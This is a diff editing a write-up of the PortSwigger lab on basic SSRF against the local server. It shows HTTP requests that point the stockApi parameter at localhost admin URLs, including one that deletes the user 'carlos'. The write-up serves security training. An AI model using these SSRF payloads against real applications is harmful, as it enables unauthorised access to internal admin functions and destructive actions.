@@ -1,13 +1,13 @@
 # PortSwigger Lab: Basic SSRF against the local server
 
-# TAGS: SSRF, Server-Side Request Forgery, Burp Suite
+**TAGS:** SSRF, Server-Side Request Forgery, Burp Suite
 
-Category: SSRF
-Date: November 3, 2026
-Day: Tuesday
-Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
-Published: Ready
-Status: Done
+**Category:** SSRF  
+**Date:** November 3, 2026  
+**Day:** Tuesday  
+**Link:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost  
+**Published:** Ready  
+**Status:** Done
 
 ---
 
@@ -30,7 +30,6 @@ I opened a product page and clicked the "Check stock" button. The browser sent t
 ```http
 POST /product/stock HTTP/2
 Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
-Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
@@ -49,7 +48,6 @@ I sent the request to Repeater and changed `stockApi` to the admin panel on loca
 ```http
 POST /product/stock HTTP/2
 Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
-Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://localhost/admin
@@ -70,13 +68,12 @@ I went back to Repeater and changed `stockApi` once more, this time to the delet
 ```http
 POST /product/stock HTTP/2
 Host: 0ade005a04129e14824bd8f400610017.web-security-academy.net
-Cookie: session=B53Kf3S3WFXaEzwlAFAkQTXrMv5CAR72
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://localhost/admin/delete?username=carlos
 ```
 
-The server fetched that URL from localhost, which counted as an authenticated admin request. The user `carlos` was deleted and the lab was solved.
+The server fetched the URL from localhost, allowing the request to reach an admin endpoint that trusts local connections. The user `carlos` was deleted and the lab was solved.
 
 ---
 
@@ -114,9 +111,9 @@ To prevent this issue, applications should:
 
 ## References
 
-- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
-- [PortSwigger — Basic SSRF against the local server (lab)](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
-- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
+- PortSwigger — Basic SSRF against the local server (lab): https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
+- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 
 ---
 
